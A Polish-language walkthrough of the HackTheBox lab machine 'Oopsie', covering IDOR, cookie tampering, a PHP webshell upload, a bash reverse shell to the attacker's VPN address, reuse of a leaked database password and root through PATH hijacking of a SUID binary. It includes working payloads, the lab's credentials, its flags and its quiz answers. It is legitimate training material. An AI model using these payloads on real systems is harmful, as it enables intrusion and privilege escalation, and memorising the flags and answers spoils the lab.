---
title: "HackTheBox - Oopsie"
date: "2025-11-18"
excerpt: "Klasyczna ścieżka: IDOR → manipulacja cookies → upload PHP → RCE → SUID + PATH hijack. Dobra maszyna do utrwalenia reverse shella i SUID."
platform: "HackTheBox"
difficulty: "Bardzo Łatwa"
solveTime: "1h 55min"
---

## Narzędzia/techniki

- nmap
- curl
- Firefox DevTools (Storage → Cookies)
- Burp Suite (Proxy, HTTP history)
- nc (netcat)
- python3 (pty spawn do stabilizacji shella)
- find, strings
- SUID misconfig + PATH hijacking

---

## Podsumowanie

Wejście odbyło się przez aplikację web: najpierw IDOR i modyfikacja cookies, aby uzyskać dostęp do panelu uploadu. Następnie wrzuciliśmy PHP webshella, co dało RCE jako www-data. Z poziomu serwera odczytany został plik db.php z hasłem do konta systemowego robert. Po przejściu na roberta eskalacja nastąpiła przez SUID-owy /usr/bin/bugtracker, który wywoływał cat bez pełnej ścieżki – zastosowanie PATH hijacking dało root shella.

User flag: `f2c74ee8db7983851ab2a96a44eb7981`

Root flag: `af13b0bee69f8a877c3faf667f7beacf`

---

## 1. Skan portów

Komenda:

```bash
nmap -sC -sV -p22,80 -oN nmap_oopsie_full.txt 10.129.95.191
```

Istotny wynik:

```
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)

```

Dalszy kierunek exploitu: HTTP na porcie 80.

---

## 2. Rekonesans HTTP i odnalezienie panelu logowania

Pobranie strony głównej:

```bash
curl -s <http://10.129.95.191/> | tee index.html
grep -iE "href=|src=" index.html

```

Istotne fragmenty:

```html
<link rel="stylesheet" href="/css/reset.min.css">
<link rel="stylesheet" href="/themes/theme.css"/>
<link rel="stylesheet" href="/css/new.css"/>
<script src="/js/min.js"></script>
<script src="/cdn-cgi/login/script.js"></script>
<script src="/js/index.js"></script>

```

Najważniejsze było odwołanie do:

```
/cdn-cgi/login/script.js
```

Wejście na:

```
<http://10.129.95.191/cdn-cgi/login/>
```

dało stronę loginu.

Na tej stronie znajdował się link "Login as Guest", który logował jako gość i przekierowywał do:

```
<http://10.129.95.191/cdn-cgi/login/admin.php>
```

Po zalogowaniu jako guest dostępne były zakładki:

Accounts

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2>
```

Tabela:

- Access ID: 2233
- Name: guest
- Email: [guest@megacorp.com](mailto:guest@megacorp.com)

Branding

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=branding&brandId=2>
```

Clients

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=2>
```

Uploads

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads>
```

Z komunikatem:

```
This action require super admin rights.
```

Odpowiedź HTB:

**What is the path to the directory on the webserver that returns a login page?**

`/cdn-cgi/login`

---

## 3. IDOR – enumeracja admina

Testowana była podatność IDOR przez modyfikację parametrów GET.

Accounts z id=1:

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1>
```

Tabela dla id=1:

- Access ID: 34322
- Name: admin
- Email: [admin@megacorp.com](mailto:admin@megacorp.com)

Clients z orgId=1:

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=1>
```

Tabela dla orgId=1:

- Client ID: 1
- Name: Tafcz
- Email: [john@tafcz.co.uk](mailto:john@tafcz.co.uk)

Wniosek:

Gość ma Access ID 2233, admin ma Access ID 34322. Access ID pojawia się później także w cookies.

Odpowiedź HTB:

**What is the access ID of the admin user?**

`34322`

---

## 4. Cookies i podniesienie uprawnień w panelu

Sprawdzenie cookies w Firefox DevTools:

Storage → Cookies → `http://10.129.95.191`

Zobaczone wartości:

```
role = "guest"
user = "2233"
```

Te wartości odpowiadają roli oraz Access ID gościa.

Edycja cookies w przeglądarce:

```
role: guest  → admin
user: 2233   → 34322
```

Po odświeżeniu:

```
<http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads>
```

zniknął komunikat o super admin i pojawił się formularz uploadu:

```html
<form action="/cdn-cgi/login/admin.php?content=uploads&action=upload"
      method="POST" enctype="multipart/form-data">
  <table class="new">
    <tr>
      <td>Brand Name</td>
      <td><input name="name" type="text"></td>
    </tr>
    <tr>
      <td colspan="2">
        <input type="file" name="fileToUpload">
        <input type="submit" value="Upload">
      </td>
    </tr>
  </table>
</form>
```

Odpowiedzi HTB:

**What can be modified in Firefox to get access to the upload page?**

`cookie`

**With what kind of tool can intercept web traffic?**

`proxy`

---

## 5. Analiza uploadu i ścieżki plików

Przechwycenie uploadu Burpem:

Request:

```
POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1
Host: 10.129.95.191
Cookie: user=34322; role=admin
Content-Type: multipart/form-data; boundary=...
...

-----------------------------boundary
Content-Disposition: form-data; name="name"

1
-----------------------------boundary
Content-Disposition: form-data; name="fileToUpload"; filename="hash.txt"
Content-Type: text/plain

<zawartość pliku>
-----------------------------boundary--
```

Odpowiedź:

```html
...
Repair Management System

The file hash.txt has been uploaded.
<script src='/js/jquery.min.js'></script>
<script src='/js/bootstrap.min.js'></script>
</body>
</html>
```

Żadnej wzmianki o ścieżce URL do pliku.

Z kodu backendu (później odczytanego jako www-data) w admin.php:

```php
if($_GET["content"]==="uploads")
{
    if($_COOKIE["user"]==="2233")
    {
        echo 'This action require super admin rights.';
    }
    else
    {
        if($_GET["action"]==="upload")
        {
            $target_dir = "/var/www/html/uploads/";
            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
            } else {
                echo "Sorry, there was an error uploading your file.";
            }
        }
        else
        {
            // formularz uploadu
        }
    }
}
```

Ścieżka uploadu na serwerze:

```
/var/www/html/uploads/
```

Publiczny URL:

```
<http://10.129.95.191/uploads/><filename>
```

Odpowiedź HTB:

**On uploading a file, what directory does that file appear in on the server?**

`/uploads`

---

## 6. Webshell i RCE jako www-data

Przygotowanie prostego webshella lokalnie:

Upload przez panel `uploads`, potwierdzenie komunikatem na stronie:

```
The file shell.php has been uploaded.
```

Test RCE:

```bash
curl "<http://10.129.95.191/uploads/shell.php?cmd=id>"
```

Wynik:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE jako www-data potwierdzone.

---

## 7. Reverse shell i stabilizacja

Ustalono IP maszyny atakującej w sieci VPN:

```bash
ip a | grep -E 'tun|wg'
# interfejs tun0 z adresem 10.10.14.139
```

Przygotowanie dedykowanego PHP reverse shell:

```bash
cat > revshell.php << 'EOF'
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.139/4444 0>&1'");
?>
EOF
```

Upload `revshell.php` przez panel uploads.

Listener na atakującym:

```bash
nc -lvnp 4444
```

Trigger w przeglądarce:

```
<http://10.129.95.191/uploads/revshell.php>
```

Na sesji nc:

```
connect to [10.10.14.139] from (UNKNOWN) [10.129.95.191] 59880
bash: cannot set terminal process group (...)
bash: no job control in this shell

www-data@oopsie:/var/www/html/uploads$ whoami
www-data
www-data@oopsie:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilizacja shella:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Na lokalnym terminalu (Kali):

```bash
# wcisnąć Ctrl+Z
stty raw -echo; fg
# Enter
```

Po tym shell zachowuje się jak zwykły terminal (działa su, sudo, edytory itp.).

---

## 8. Odczyt db.php i przejście na roberta

W katalogu aplikacji:

```bash
cd /var/www/html/cdn-cgi/login
ls
# admin.php db.php index.php script.js
```

Treść db.php:

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

To zawiera hasło do użytkownika robert, używane zarówno do DB, jak i konta systemowego.

Treść index.php ujawnia też dane HTTP admina (dla kontekstu):

```php
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
{
    $cookie_name = "user";
    $cookie_value = "34322";
    setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
    setcookie('role','admin', time() + (86400 * 30), "/");
    header('Location: /cdn-cgi/login/admin.php');
}
```

Odpowiedź HTB:

**What is the file that contains the password that is shared with the robert user?**

`db.php`

Przejście na roberta:

```bash
su robert
# hasło: M3g4C0rpUs3r!
```

Po zalogowaniu:

```bash
whoami
# robert

id
# uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

User flag:

```bash
ls -la /home/robert
cat /home/robert/user.txt
# f2c74ee8db7983851ab2a96a44eb7981
```

---

## 9. Eskalacja do roota przez SUID /usr/bin/bugtracker

Enumeracja plików należących do grupy bugtracker:

```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker
```

Odpowiedź HTB:

**What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?**

`find`

Sprawdzenie binarki:

```bash
ls -l /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

file /usr/bin/bugtracker
# /usr/bin/bugtracker: setuid ELF 64-bit ...
```

Istotne:

- `rwsr-xr--` – litera s w miejscu `x` w prawach właściciela oznacza SUID.

Plik wykonywalny z SUID uruchamia się z effective UID właściciela, tu właściciel to root.

Odpowiedź HTB:

**Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?**

`root`

Analiza strings:

```bash
strings /usr/bin/bugtracker | head -n 40
strings /usr/bin/bugtracker | grep -i cat
```

Istotne linie:

```
------------------
: EV Bug Tracker :
------------------
Provide Bug ID:
---------------
cat /root/reports/
```

To wskazuje, że program w środku wykonuje:

```c
system("cat /root/reports/<ID>");
```

bez podania pełnej ścieżki do `cat`.

Odpowiedzi HTB:

**What SUID stands for?**

`Set owner User ID`

**What is the name of the executable being called in an insecure manner?**

`cat`

---

## 10. PATH hijacking i root shell

Wyjaśnienie SUID:

Jeśli plik wykonywalny ma bit SUID i właściciela root, to każdy, kto go odpali, uruchomi proces z effective UID równym root. Dzięki temu bugtracker zawsze wykonuje się jako root, niezależnie od tego, że uruchamiany jest z konta robert.

Wyjaśnienie PATH:

PATH to zmienna środowiskowa określająca listę katalogów, w których shell szuka programów, gdy wywołujesz je bez pełnej ścieżki (np. `ls`, `cat`, `id`). Przykładowa wartość:

```bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Jeśli wpiszesz samo `cat`:

- shell szuka kolejno `/usr/local/sbin/cat`, potem `/usr/local/bin/cat`, potem `/usr/sbin/cat`, `/usr/bin/cat`, itd.
- bierze pierwsze istniejące.

Jeśli podasz pełną ścieżkę, np.:

```bash
/bin/cat /root/root.txt
```

PATH nie jest używany – wykonywany jest dokładnie `/bin/cat`.

W naszym przypadku bugtracker używa `cat` bez ścieżki w `system("cat /root/reports/...")`, więc możemy przechwycić to wywołanie przez manipulację PATH.

Kroki exploitu:

Stworzenie złośliwego `cat` w /tmp:

```bash
cd /tmp
cat > cat << 'EOF'
#!/bin/bash
/bin/bash
EOF

chmod +x /tmp/cat
```

Sprawdzenie PATH i jego modyfikacja:

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

export PATH=/tmp:$PATH

echo $PATH
# /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Po tej zmianie każde wywołanie `cat` bez pełnej ścieżki użyje `/tmp/cat` (naszego skryptu), zanim dotrze do `/bin/cat`.

Uruchomienie bugtrackera:

```bash
/usr/bin/bugtracker
```

Wyświetla:

```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID:
```

Po podaniu np. `1`:

```
Provide Bug ID: 1
---------------
```

bugtracker (jako root, dzięki SUID) wykonuje `system("cat /root/reports/1")`, ale przez zmodyfikowany PATH tak naprawdę uruchamia `/tmp/cat`, który odpala `/bin/bash` z effective UID=root.

Potwierdzenie:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) ...
```

Root flag:

Uwaga: ponieważ `cat` zostało podmienione, użycie samego `cat` nie pokaże zawartości pliku. Trzeba użyć pełnej ścieżki:

```bash
/bin/cat /root/root.txt
# af13b0bee69f8a877c3faf667f7beacf
```

---

## Wnioski / czego się nauczyłem

IDOR + cookies:

Prosta zmiana parametrów GET (id, orgId, brandId) i podgląd innych rekordów („accounts”) pozwoliła wydobyć Access ID admina. Cookies (`user`, `role`) odzwierciedlały stan uprawnień w panelu. Manipulacja ich wartościami (user=34322, role=admin) z poziomu przeglądarki umożliwiła dostęp do funkcji dostępnych tylko dla admina – panelu uploadu.

Upload → RCE:

Brak walidacji rozszerzeń uploadowanych plików i prosta konfiguracja target_dir w admin.php pozwoliły na wrzucenie PHP webshella do katalogu /uploads. Ścieżka nie była ujawniona w odpowiedziach HTTP – można ją było ustalić z kodu (admin.php), brute-forcem (gobuster) albo zgadywaniem.

Reverse shell i stabilizacja:

Prosty webshell (`<?php system($_GET['cmd']); ?>`) pozwolił wykonać dowolne komendy, a dedykowany `revshell.php` dał pełny reverse shell. Stabilizacja za pomocą:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# lokalnie: Ctrl+Z; stty raw -echo; fg
```

jest kluczowa, żeby `su`, edytory i inne narzędzia działały normalnie.

SUID i PATH hijack:

SUID (Set owner User ID) sprawia, że plik działa z uprawnieniami właściciela, niezależnie od aktualnego użytkownika. W połączeniu z `system("cat ...")` bez pełnej ścieżki do `cat`, manipulacja PATH (`export PATH=/tmp:$PATH`) pozwala podsunąć złośliwą implementację `cat` i przejąć wykonanie komendy. To klasyczny pattern privesc, warto go mieć „z ręki”.

Cały łańcuch (IDOR → cookies → upload → RCE → SUID + PATH hijack) jest bardzo reprezentatywny dla realnych ścieżek w prostszych CTF-ach i w audytach źle zabezpieczonych aplikacji webowych.
